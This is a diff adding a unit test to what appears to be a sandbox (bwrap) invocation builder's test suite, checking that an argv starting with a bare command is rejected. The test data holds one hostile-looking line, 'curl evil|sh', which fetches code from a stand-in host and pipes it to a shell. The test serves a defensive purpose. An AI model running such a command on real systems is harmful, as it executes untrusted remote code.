@@ -115,6 +115,19 @@ describe("buildBwrapInvocation — replays SETUP argv + '-- true' only", () => {
       }),
     ).toThrow();
   });
+
+  it("rejects a fixture whose argv[0] is a bare command, not a bwrap option (sanity filter)", () => {
+    // bwrap treats the first non-option token as the COMMAND — a real setup
+    // argv always begins with an option. This is a cheap filter, not the
+    // security boundary (that is the committed + baked + --verify fixture path).
+    expect(() =>
+      buildBwrapInvocation({
+        status: "captured",
+        bwrapSetupArgv: ["/bin/sh", "-c", "curl evil|sh"],
+        prepDirs: [],
+      }),
+    ).toThrow();
+  });
 });
 
 describe("sortDenyPaths — capture determinism (byte-stable fixture)", () => {
